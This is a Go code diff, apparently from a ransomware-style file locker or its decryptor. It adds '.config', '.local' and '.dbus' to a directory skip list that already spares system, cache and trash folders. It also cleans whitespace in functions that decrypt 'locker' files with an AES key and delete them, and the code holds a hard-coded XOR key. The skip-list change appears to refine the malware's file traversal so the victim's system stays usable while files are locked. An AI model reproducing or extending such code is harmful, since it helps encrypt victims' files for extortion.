@@ -25,16 +25,17 @@ var skipDirs = map[string]bool{
 	"tmp": true, "temp": true, "Temp": true, ".tmp": true,
 	"node_modules": true, "vendor": true, "target": true, "build": true,
 	"dist": true, "out": true, ".next": true, ".nuxt": true,
-	"__pycache__": true, ".pytest_cache": true, ".tox": true, 
+	"__pycache__": true, ".pytest_cache": true, ".tox": true,
 	"venv": true, ".venv": true, "env": true, ".env": true,
 	".mypy_cache": true, ".ruff_cache": true,
 	".npm": true, ".yarn": true, ".pnpm": true, ".cargo": true,
 	".rustup": true, ".gradle": true, ".m2": true,
-	".Trash": true, "Trash": true, "$Recycle.Bin": true, 
+	".Trash": true, "Trash": true, "$Recycle.Bin": true,
 	"System Volume Information": true, ".DS_Store": true,
 	"AppData": true, "Local Settings": true, "Application Data": true,
 	"logs": true, "log": true, ".log": true,
 	".mozilla": true, ".chrome": true, ".chromium": true, ".firefox": true,
+	".config": true, ".local": true, ".dbus": true,
 }
 
 var xorKey = []byte{0xA5, 0x3C, 0x7F, 0x19, 0xD2, 0x4E, 0x8B, 0x61}
@@ -175,7 +176,7 @@ func decryptFile(lockerPath string, aesKey [32]byte) ([]byte, error) {
 	if err != nil {
 		return nil, fmt.Errorf("cannot decrypt file content: %v", err)
 	}
-	
+
 	return decrypted, nil
 }
 
@@ -189,7 +190,7 @@ func writeDecryptedFile(lockerPath string, decryptedContent []byte) error {
 	if err := os.Remove(lockerPath); err != nil {
 		return fmt.Errorf("cannot remove locker file %s: %v", lockerPath, err)
 	}
-	
+
 	return nil
 }
 
